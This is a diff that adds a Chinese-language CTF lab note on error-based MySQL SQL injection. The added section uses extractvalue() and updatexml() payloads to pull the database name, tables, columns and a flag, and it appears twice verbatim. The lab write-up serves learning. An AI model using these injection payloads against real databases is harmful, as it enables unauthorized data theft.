@@ -337,4 +337,120 @@ pin: true
     ```
     
     ![image-20241119094030945](https://cdn.jsdelivr.net/gh/Beam-boop/cloudimages/imagesimage-20241119094030945.png)
+
+        - #### 报错注入
+    
+      有两种办法😌进行报错注入
+    
+      1. `extractvalue()`，`extractvalue()`函数用于查询XML文档中的数据，如果提供的XPath表达式不符合XML规范，将导致SQL执行错误，并返回错误信息，其中包含了非法格式的内容。这个特性可以被用来执行SQL注入攻击，通过构造特定的查询语句来获取数据库信息；接受两个参数：第一个参数是XML文档对象的名称（`XML_document`），第二个参数是XPath格式的字符串（`XPath_string`），用于指定需要提取的XML部分
+      2. `updatexml()`， 函数的作用是改变文档中符合条件的节点的值。如果 XPath 表达式无效，数据库会返回错误信息，错误信息中可能包含数据库版本、用户名、表名、列名等敏感信息，这使得 `updatexml()` 函数在 SQL 注入攻击中被利用；接受三个参数：
+         - **xml_target**：这是第一个参数，表示需要操作的 XML 片段，它是一个字符串类型的参
+         - **xpath_expr**：这是第二个参数，表示需要更新的 XML 路径，使用 XPath 格式。如果这个参数的格式不正确，MySQL 会返回一个错误信息，这可以被利用来进行 SQL 注入攻击。
+         - **new_xml**：这是第三个参数，表示更新后的内容，它也是一个字符串类型的参数。
+    
+      利用extractvalue()来进行
+    
+      ```sql
+      1 and (select extractvalue(1, concat(0x7e, database())))
+      ```
+    
+      ![image-20241121203531765](https://cdn.jsdelivr.net/gh/Beam-boop/cloudimages/imagesimage-20241121203531765.png)
+    
+      ```sql
+      1 and (select extractvalue(1, concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema='sqli'))))
+      ```
+    
+      ![image-20241121204115262](https://cdn.jsdelivr.net/gh/Beam-boop/cloudimages/imagesimage-20241121204115262.png)
+    
+      ```sql
+      1 and (select extractvalue(1, concat(0x7e, (select group_concat(column_name) from information_schema.columns where table_name='flag'))))
+      ```
+    
+      ```sql
+      1 and (select extractvalue (1, concat(0x7e, (select flag from flag))))
+      ```
+    
+      ![image-20241121204535173](https://cdn.jsdelivr.net/gh/Beam-boop/cloudimages/imagesimage-20241121204535173.png)
+    
+      ```sql
+      1 and (select updatexml(1,concat(0x7e, database()),1))
+      ```
+    
+      ![image-20241121204856373](https://cdn.jsdelivr.net/gh/Beam-boop/cloudimages/imagesimage-20241121204856373.png)
+    
+      ```sql
+      1 and (select updatexml(1,(concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema='sqli'))),1))
+      ```
+    
+      ```sql
+      1 and (select updatexml(1,(concat(0x7e, (select group_concat(column_name) from information_schema.columns where table_name='flag'))),1))
+      ```
+    
+      ```sql
+      1 and (select updatexml (1, concat(0x7e, (select flag from flag)),1))	
+      ```
+    
+      其实最后的拿到flag只有一部份，幸好知识加个右中括号就可以搞定，但是如果缺少字母得怎么办，其实可以用right去获取右边的字符
+    
+      ```sql
+      1 and (select updatexml (1, concat(0x7e, (select right(flag,3) from flag)),1))	
+      ```
+
+    - #### 报错注入
+    
+      有两种办法😌进行报错注入
+    
+      1. `extractvalue()`，`extractvalue()`函数用于查询XML文档中的数据，如果提供的XPath表达式不符合XML规范，将导致SQL执行错误，并返回错误信息，其中包含了非法格式的内容。这个特性可以被用来执行SQL注入攻击，通过构造特定的查询语句来获取数据库信息；接受两个参数：第一个参数是XML文档对象的名称（`XML_document`），第二个参数是XPath格式的字符串（`XPath_string`），用于指定需要提取的XML部分
+      2. `updatexml()`， 函数的作用是改变文档中符合条件的节点的值。如果 XPath 表达式无效，数据库会返回错误信息，错误信息中可能包含数据库版本、用户名、表名、列名等敏感信息，这使得 `updatexml()` 函数在 SQL 注入攻击中被利用；接受三个参数：
+         - **xml_target**：这是第一个参数，表示需要操作的 XML 片段，它是一个字符串类型的参
+         - **xpath_expr**：这是第二个参数，表示需要更新的 XML 路径，使用 XPath 格式。如果这个参数的格式不正确，MySQL 会返回一个错误信息，这可以被利用来进行 SQL 注入攻击。
+         - **new_xml**：这是第三个参数，表示更新后的内容，它也是一个字符串类型的参数。
+    
+      利用extractvalue()来进行
+    
+      ```sql
+      1 and (select extractvalue(1, concat(0x7e, database())))
+      ```
+    
+      ![image-20241121203531765](https://cdn.jsdelivr.net/gh/Beam-boop/cloudimages/imagesimage-20241121203531765.png)
+    
+      ```sql
+      1 and (select extractvalue(1, concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema='sqli'))))
+      ```
+    
+      ![image-20241121204115262](https://cdn.jsdelivr.net/gh/Beam-boop/cloudimages/imagesimage-20241121204115262.png)
+    
+      ```sql
+      1 and (select extractvalue(1, concat(0x7e, (select group_concat(column_name) from information_schema.columns where table_name='flag'))))
+      ```
+    
+      ```sql
+      1 and (select extractvalue (1, concat(0x7e, (select flag from flag))))
+      ```
+    
+      ![image-20241121204535173](https://cdn.jsdelivr.net/gh/Beam-boop/cloudimages/imagesimage-20241121204535173.png)
+    
+      ```sql
+      1 and (select updatexml(1,concat(0x7e, database()),1))
+      ```
+    
+      ![image-20241121204856373](https://cdn.jsdelivr.net/gh/Beam-boop/cloudimages/imagesimage-20241121204856373.png)
+    
+      ```sql
+      1 and (select updatexml(1,(concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema='sqli'))),1))
+      ```
+    
+      ```sql
+      1 and (select updatexml(1,(concat(0x7e, (select group_concat(column_name) from information_schema.columns where table_name='flag'))),1))
+      ```
+    
+      ```sql
+      1 and (select updatexml (1, concat(0x7e, (select flag from flag)),1))	
+      ```
+    
+      其实最后的拿到flag只有一部份，幸好知识加个右中括号就可以搞定，但是如果缺少字母得怎么办，其实可以用right去获取右边的字符
+    
+      ```sql
+      1 and (select updatexml (1, concat(0x7e, (select right(flag,3) from flag)),1))	
+      ```
     
